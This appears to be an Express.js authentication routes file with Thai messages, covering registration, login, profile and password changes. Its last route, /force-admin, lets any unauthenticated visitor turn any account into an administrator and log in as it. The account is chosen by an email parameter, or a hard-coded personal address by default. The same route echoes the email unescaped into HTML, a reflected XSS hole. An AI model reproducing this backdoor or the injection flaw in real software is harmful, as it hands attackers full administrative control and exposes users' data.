// routes/authRoutes.js
const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const db = require('../config/db');

// Register
router.post('/register', async (req, res) => {
  try {
    const { username, email, password, full_name, phone } = req.body;
    if (!username || !email || !password) {
      return res.status(400).json({ success: false, message: 'กรุณากรอกข้อมูลให้ครบถ้วน' });
    }

    const { rows: existing } = await db.query(
      'SELECT id FROM users WHERE username = $1 OR email = $2', [username, email]
    );
    if (existing.length > 0) {
      return res.status(409).json({ success: false, message: 'ชื่อผู้ใช้หรืออีเมลนี้ถูกใช้แล้ว' });
    }

    const hash = await bcrypt.hash(password, 10);
    await db.query(
      'INSERT INTO users (username, email, password_hash, full_name, phone) VALUES ($1, $2, $3, $4, $5)',
      [username, email, hash, full_name || '', phone || '']
    );

    res.json({ success: true, message: 'สมัครสมาชิกสำเร็จ' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาด' });
  }
});

// Login
router.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'กรุณากรอกชื่อผู้ใช้และรหัสผ่าน' });
    }

    const { rows: users } = await db.query(
      'SELECT * FROM users WHERE username = $1 OR email = $2', [username, username]
    );
    if (users.length === 0) {
      return res.status(401).json({ success: false, message: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง' });
    }

    const user = users[0];
    const match = await bcrypt.compare(password, user.password_hash);
    if (!match) {
      return res.status(401).json({ success: false, message: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง' });
    }

    req.session.user = {
      id: user.id,
      username: user.username,
      email: user.email,
      role: user.role,
      full_name: user.full_name
    };

    res.json({
      success: true,
      message: 'เข้าสู่ระบบสำเร็จ',
      user: req.session.user
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาด' });
  }
});

// Logout
router.post('/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true, message: 'ออกจากระบบสำเร็จ' });
});

// Get current user
router.get('/me', (req, res) => {
  if (req.session && req.session.user) {
    res.json({ success: true, user: req.session.user });
  } else {
    res.json({ success: false, user: null });
  }
});

// Update profile
router.put('/profile', async (req, res) => {
  if (!req.session || !req.session.user) {
    return res.status(401).json({ success: false, message: 'กรุณาเข้าสู่ระบบ' });
  }
  try {
    const { full_name, phone, address } = req.body;
    await db.query(
      'UPDATE users SET full_name=$1, phone=$2, address=$3 WHERE id=$4',
      [full_name, phone, address, req.session.user.id]
    );
    req.session.user.full_name = full_name;
    res.json({ success: true, message: 'อัปเดตข้อมูลสำเร็จ' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาด' });
  }
});

// Get full user profile
router.get('/profile', async (req, res) => {
  if (!req.session || !req.session.user) {
    return res.status(401).json({ success: false, message: 'กรุณาเข้าสู่ระบบ' });
  }
  try {
    const { rows: users } = await db.query(
      'SELECT id, username, email, full_name, phone, address, role, created_at FROM users WHERE id = $1',
      [req.session.user.id]
    );
    if (users.length === 0) return res.status(404).json({ success: false, message: 'ไม่พบผู้ใช้' });
    res.json({ success: true, user: users[0] });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาด' });
  }
});

// Change password
router.put('/password', async (req, res) => {
  if (!req.session || !req.session.user) {
    return res.status(401).json({ success: false, message: 'กรุณาเข้าสู่ระบบ' });
  }
  try {
    const { old_password, new_password } = req.body;
    if (!old_password || !new_password) {
      return res.status(400).json({ success: false, message: 'กรุณากรอกรหัสผ่านให้ครบถ้วน' });
    }

    const { rows: users } = await db.query('SELECT password_hash FROM users WHERE id = $1', [req.session.user.id]);
    if (users.length === 0) return res.status(404).json({ success: false, message: 'ไม่พบผู้ใช้' });

    const match = await bcrypt.compare(old_password, users[0].password_hash);
    if (!match) return res.status(400).json({ success: false, message: 'รหัสผ่านเดิมไม่ถูกต้อง' });

    const hash = await bcrypt.hash(new_password, 10);
    await db.query('UPDATE users SET password_hash = $1 WHERE id = $2', [hash, req.session.user.id]);

    res.json({ success: true, message: 'เปลี่ยนรหัสผ่านสำเร็จ' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาดในการเปลี่ยนรหัสผ่าน' });
  }
});

// API พิเศษสำหรับล็อกอินเป็น Admin ทันที (ไม่ต้องใช้รหัสผ่าน)
router.get('/force-admin', async (req, res) => {
  try {
    const email = req.query.email || 'somtodlove1@gmail.com';
    
    // 1. อัปเดตบัญชีนี้ให้กลายเป็น Admin ทันที
    await db.query("UPDATE users SET role = 'admin' WHERE email = $1", [email]);
    
    // 2. ดึงข้อมูลขึ้นมา
    const { rows: users } = await db.query('SELECT * FROM users WHERE email = $1', [email]);
    
    if (users.length === 0) {
      return res.send('<h3>ไม่พบบัญชีนี้ กรุณาสมัครสมาชิกด้วยอีเมล ' + email + ' ก่อน แล้วค่อยคลิกลิงก์นี้ใหม่</h3>');
    }
    
    const user = users[0];
    
    // 3. ฝัง Session ลงไปเลยถือว่าล็อกอินแล้ว
    req.session.user = {
      id: user.id,
      username: user.username,
      email: user.email,
      role: 'admin', // ยืนยันสิทธิ์เป็น admin
      full_name: user.full_name
    };
    
    // 4. พาไปหน้า Admin ทันที
    res.redirect('/admin');
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาด' });
  }
});

module.exports = router;
